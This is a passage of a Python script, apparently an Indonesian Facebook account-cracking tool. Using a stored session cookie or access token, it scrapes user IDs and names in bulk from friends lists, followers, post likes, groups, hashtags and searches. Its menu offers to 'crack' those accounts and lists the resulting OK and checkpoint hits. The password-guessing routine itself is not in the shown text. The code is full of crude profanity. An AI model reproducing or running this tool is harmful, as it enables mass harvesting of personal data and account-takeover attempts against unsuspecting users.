import os,sys,re,json,random
from time import sleep as waktu
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
ok=0
cp=0
loop =0
live=[]
chek=[]
ttl= []
id = []
jam = datetime.now().strftime('%H:%M:%S')
mbasic="https://mbasic.facebook.com{}"
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try: import requests as req
except ModuleNotFoundError: os.system("python -m pip install requests");restart()
try: from bs4 import BeautifulSoup as parser
except ModuleNotFoundError: os.system("python -m pip install bs4");restart()
user_agent = random.choice(["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"])
runtah=["lib/__pycache__"]
try:
	hapus(runtah[0])
except:
	pass
try:
	hapus(runtah[1])
except:
	pass

def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print("\n\n %s[%s#%s] Crack Selesai..."%(N,O,N))
		print(f"\n %s[%s✓%s] Total OK : %s{len(ok)}"%(N,H,N,H))
		exit(f" %s[%s×%s] Total CP :%s {len(cp)}"%(N,K,N,K))
	else:exit("\n\n %s[%s!%s] opshh kamu tidak mendapatkan hasil:( "%(N,M,N))

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print(f"\r %s[%s×%s] Menghapus cookies {x} "%(N,M,N),end="")
        waktu(1)

def ngentod():
    kentod = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for z in kentod:
        print(f"\r %s[%s✓%s] Mohon tunggu sebentar {z} "%(N,H,N),end="")
        waktu(1)
        
def __nguh__():
    kentod = ['=', '==', '===', '====', '=====', '======', '=======', '========', '=========', '==========', '===========', '============', '=============', '==============', '===============', '================', '=================', '==================', '===================', '====================', '=====================', '======================', '=======================', '========================', '=========================', '==========================', '==========================', '============================', '=============================', '==============================', '===============================', '================================', '=================================', '==================================', '===================================', '====================================', '=====================================', '======================================', '=======================================', '========================================', '=========================================', '==========================================', '===========================================', '============================================', '=============================================', '===============================================', '================================================']
    for a in kentod:
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write(f"\r "+ w +"%s                                        \r\n\n%s[%s%s%s] Proses mengupdate tools"%(a,N,O,jam,N)); sys.stdout.flush()
        waktu(0.07)
        
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        waktu(0.03)
        
tahun = current.year
bulan = current.month
hari  = current.day
IP = req.get('https://api.ipify.org').text
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
# LO KONTOL
def logo():
	os.system("clear")
	print(f"""{M}
 ╦═╗╔═╗╦ ╦   ╦ ╦╔╦╗╔╗ ╔═╗{K}
 ╠╦╝║ ║╚╦╝───╚╦╝║║║╠╩╗╠╣ {H}
 ╩╚═╚═╝ ╩     ╩ ╩ ╩╚═╝╚{N}""")

# cek ingfo sc
def info_tools():
    os.system('clear')
    print( ' %s[%s#%s]'%(N,O,N)), 52 * '\x1b[1;96m-\x1b[0m';waktu(0.07)
    print( '\n %s[%s>%s] Yt       : Yayan XD.'%(N,H,N));waktu(0.07)
    print( '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N));waktu(0.07)
    print( '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N));waktu(0.07)
    print( '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N));waktu(0.07)
    print( '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N));waktu(0.07)
    print( '\n %s[%s>%s] Instagram: https://www.instagram.com/yayanxd_'%(N,H,N));waktu(0.07)
    print( '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N));waktu(0.07)
    print( '\n %s[%s#%s]'%(N,O,N)), 52 * '\x1b[1;96m-\x1b[0m';waktu(0.07)
    input(' [ %sKEMBALI%s ] '%(O,N))
    ngewe().menu()
    
def dump_id():
	print ('\n [%s1%s]. Dump ID dari Teman Publik'%(O,N))
	print (' [%s2%s]. Dump ID dari Total Followers'%(O,N))
	print (' [%s3%s]. Dump ID dari Like Postingan'%(O,N))
	__ngontol__()
	
def __ngontol__():
	tod = input('\n [*] Menu : ')
	if tod == '':
		print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);__ngontol__()
	elif tod =='1':
		teman()
	elif tod =='2':
		followers()
	elif tod =='3':
		postingan()
	else:
		print('\n %s[%s×%s] Isi yang bener'%(N,M,N));waktu(1);__ngontol__()

# ---- Method Token --->

# dump teman
def teman():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print ('\n %s[%s!%s] Token invalid'%(N,M,N))
        os.system('rm -rf __yayan__.txt')
        waktu(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        print (f"\n {N}[{M}!{N}] Isi 'me' jika ingin Dump ID dari Daftar Teman")
        asw = input('\n %s[%s?%s] ID Publik  : '%(N,O,N))
        mmk = input(' %s[%s?%s] Nama File  : '%(N,O,N))
        ihh = req.get('https://graph.facebook.com/%s/friends?limit=50000000&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            waktu(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
        print( 50 * '=')
        input(' [%s ENTER%s ] '%(O,N))
        ngewe().menu()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        input(' [ %sKEMBALI%s ] '%(O,N))
        ngewe().menu()
        
#dump followers
def followers():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print ('\n %s[%s×%s] Token Invalid'%(N,M,N))
        os.system('rm -rf __yayan__.txt')
        waktu(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        asw = input(' %s[%s?%s] ID Followers  : '%(N,O,N))
        mmk = input(' %s[%s?%s] Nama File     : '%(N,O,N))
        ihh = req.get('https://graph.facebook.com/%s/subscribers?limit=5000000000&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            waktu(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
        print( 50 * '=')
        input(' [%s ENTER%s ] '%(O,N))
        ngewe().menu()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        input(' [ %sKEMBALI%s ] '%(O,N))
        ngewe().menu()
        
#dump postingan
def postingan():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print ('\n %s[%s×%s] Token Invalid'%(N,M,N))
        os.system('rm -rf __yayan__.txt')
        waktu(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        asw = input(' %s[%s?%s] ID Followers  : '%(N,O,N))
        mmk = input(' %s[%s?%s] Nama File     : '%(N,O,N))
        ihh = req.get('https://graph.facebook.com/%s/likes?limit=5000000000000&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            waktu(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
        print( 50 * '=')
        input(' [%s ENTER%s ] '%(O,N))
        ngewe().menu()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        input(' [ %sKEMBALI%s ] '%(O,N))
        ngewe().menu()
        

class sunda:
	def __init__(self,url):
		self.url=url
		try:
			__kontol__ = open('__yayan__.txt','r').read()
		except (KeyError, IOError,FileNotFoundError):
			print('\n %s[%s×%s] Cookies Invalid'%(N,M,N));waktu(1)
			try:os.remove('cookies');os.remove('__yayan__.txt')
			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
			yayanxd()
		try:
			masuk  = req.get(f'https://graph.facebook.com/me?access_token=%s'%(__kontol__))
			keluar = json.loads(masuk.text)
			nama   = keluar['name']
			idfb   = keluar['id']
		except (KeyError, IOError,FileNotFoundError):
			print('\n %s[%s×%s] Cookies Invalid'%(N,M,N));waktu(1)
			try:os.remove('cookies');os.remove('__yayan__.txt')
			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
			yayanxd()
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit('\n %s[%s!%s] Tidak ada koneksi internet'%(N,M,N))
		logo()
		print( 50 * '=')
		print(f" [⭐] Author      : {K}Roy Octa Firdaus{N}")
		print(f" [⭐] Code by     : {K}Yayan-XD{N}")
		print(f" [⭐] Facebook    : {K}facebook/JbFbOld{N}")
		print(f" [⭐] WhatsApp    : {K}+6281318306972{N}")
		print( 50 * '=')
		print(f" [ Selamat datang {K}{nama}{N} ]")
		print( 50 * '=')
		print(f" [⭐] ID FB Anda   : {K}{idfb}{N}")
		print(f" [⭐] IP Anda      : {K}{IP}{N}")
		print(f" [⭐] Status       : {H}Premium{N}")
		print(f" [⭐] Bergabung    : {K}{hari}-{bulan}-{tahun}{N}")
		print( 50 * '=')
		print(f" [{K}?{N}]{O} Menu Pilihan{N}  ")
		print(" %s[%s01%s]. Crack dari Pencarian Nama"%(N,K,N))
		print(" %s[%s02%s]. Crack dari ID Publik"%(N,K,N))
		print(" %s[%s03%s]. Crack dari Followers"%(N,K,N))
		print(" %s[%s04%s]. Crack dari Like Postingan"%(N,K,N))
		print(" %s[%s05%s]. Crack dari Grup"%(N,K,N))
		print(" %s[%s06%s]. Crack dari Hastag"%(N,K,N))
		print(" %s[%s07%s]. Cek hasil Crack (%sNew%s)"%(N,K,N,H,N))
		print(" %s[%s08%s]. Info %sSC ROY %s(%sNew%s)"%(N,K,N,K,N,H,N))
		print(" %s[%s09%s]. Fitur Dump ID (%sNew%s)"%(N,K,N,H,N))
		print(" %s[%s10%s]. Update SC (%sNew%s)"%(N,H,N,H,N))
		print(" %s[%s00%s]. Logout (%sHapus Cookies%s)"%(N,M,N,M,N))
		print( 50 * '=')
		
# ---- Method Cookies --->
class ngewe:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
# dump id dari followers
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"<=>"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(softek[0]+"<=>"+softek[1])
				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
# dump id dari grup
	def grup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(softek[0]+"<=>"+softek[1])
				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat Selengkapnya" in kontol:
				self.grup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=kueh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
					if "Lihat Postingan Lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
# dump id dari pencarian nama
	def search(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"<=>"+softek[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"<=>"+softek[2])
				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.search(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
# dump id dari teman
	def teman(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat selengkapnya" in kontol:
				self.teman(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
# dump id teman dari teman
	def teman_dari_teman(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat Teman Lain" in kontol:
				self.teman_dari_teman(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
# dump id dari postingan
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print(" [!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
					print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
# dump id dari hastag
	def hastag(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ class\=\".."\ href\=\"(.*?)__tn__=C">(.*?)</a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					tol=re.search("profile.php\?id=(\\d*)",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"<=>"+softek[1])
				else:
					tol=re.search("/(.*?)\?",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"<=>"+softek[1])
				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.hastag(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
# menu
	def menu(self):
		sunda(self.url)
		jembut = input(f"\n [?] Pilih : {warna}")
		if jembut in["1","01"]:
			while True:
				kontol = input(f" {N}[?] Masukan Nama Pencarian (cht : zuck): ")
				if kontol in[""," "]:
					print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f" [!] pengguna dengan nama {kontol} tidak ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
						else:
							jumlah = int(input(" [?] masukan jumlah id : "))
							print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.search(f"{self.url}/search/people/?q={kontol}",jumlah);break
							else: exit("\n [!] max 5000 ajg gosah berlebihan")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("\n [!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("\n [!] Isi yang bener")
		elif jembut in["2","02"]:
			print (f"{N} [*] Isi 'me' jika ingin Crack dari Daftar Teman")
			kontol = input(" [?] masukan id atau username : ")
			if kontol in[""," "]:
				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f" [!] daftar teman tidak di publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f" [!] pengguna dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f" [!] Pengguna Dengan Id {kontol} tidak ditemukan");waktu(2);self.menu()
				elif kontol in["ME","Me","me"]:
					self.teman(f"{self.url}/friends/center/friends/")
				else:
					#print(" [*] crack dari teman : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
					self.teman_dari_teman(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit(" [!] kesalahan pada koneksi")
		elif jembut in["3","03"]:
			kontol = input(f"{N} [?] Masukan ID atau Username Followers : ")
			if kontol in[""," "]:
				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f" [!] penggunaan dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f" [!] penggunaan dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
				else:
					print(" [*] crack total followers dari : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
					self.folower(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit(" [!] kesalahan pada koneksi")
		elif jembut in["4","04"]:
			kontol = input(f"{N} [?] URL atau ID Postingan : ")
			print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
			if kontol in[""," "]:
				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f" [!] posting tidak ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print(" [!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit(" [!] kesalahan pada koneksi")
			except req.exceptions.MissingSchema:
				print(f" [!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
		elif jembut in["5","05"]:
			while True:
				kontol = input(f"{N} [?] Masukkan ID Grup : ")
				if kontol in[""," "]:
					print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f" [!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f" [!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
						else:
							print(" [*] Nama Grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
							print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
							self.grup(f"{self.url}/browse/group/members/?id={kontol}");break
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit(" [!] Kesalahan Pada Koneksi")
		elif jembut in["6","06"]:
			while True:
				kontol = input(f"{N} [?] Hastag : ")
				if kontol in[""," "]:
					print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
				else:
					try:
						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg or "Halaman yang Anda minta tidak ditemukan." in ajg:
							print(f" [!] hashtag {kontol} tidak ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
						elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
							print(f" [!] postingan dengan hashtag {kontol} disembunyikan karna melanggar standar komunitas facebook");waktu(2);self.menu()
						else:
							jumlah=int(input(" [?] Masukan Jumlah ID : "))
							print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.hastag(f"{self.url}/hashtag/{kontol}",jumlah);break
							else: exit("\n [!] max 5000 ajg gosah berlebihan")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit(" [!] kesalahan pada koneksi")
					except ValueError:
						exit(" [!] isi yang bener ajg")
		elif jembut in["7","07"]:
			print("\n %s[%s1%s] Check hasil OK"%(N,O,N))
			print(" %s[%s2%s] Check hasil CP"%(N,O,N))
			ask=input("\n %s[%s?%s] Pilih : "%(N,K,N))
			if ask in[""," "]: 
				print(" [!] Pilih yang bener");self.menu()
			elif ask in["1","01"]:
				try:
					totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
					print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
					print(" [%s+%s] Hasil %sOK%s pada tanggal %s: %s%s-%s-%s%s total %s: %s%s%s\n"%(H,N,H,N,M,H,ha,op,ta,N,M,H,len(totalok),H))
					os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
					print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
				except (IOError):
					print("\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil ok :("%(N,M,N))
					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
			elif ask in["2","02"]:
				try:
					totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
					print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
					print(" [%s×%s] Hasil %sCP%s pada tanggal %s: %s%s-%s-%s%s total %s: %s%s%s\n"%(K,N,K,N,M,K,ha,op,ta,N,M,K,len(totalcp),K))
					os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
					print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
				except (IOError):
